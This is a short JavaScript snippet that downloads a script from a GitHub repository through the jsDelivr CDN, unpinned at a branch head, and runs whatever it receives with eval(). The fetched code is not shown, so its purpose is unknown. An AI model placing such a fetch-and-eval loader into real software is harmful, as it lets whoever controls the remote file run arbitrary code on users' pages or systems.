```
fetch('https://cdn.jsdelivr.net/gh/huynhthanhtien/test_js@refs/heads/main/js.js')
  .then(response => response.text())
  .then(script => {
    eval(script);
  })
  .catch(error => console.error('Error loading the script:', error));
```
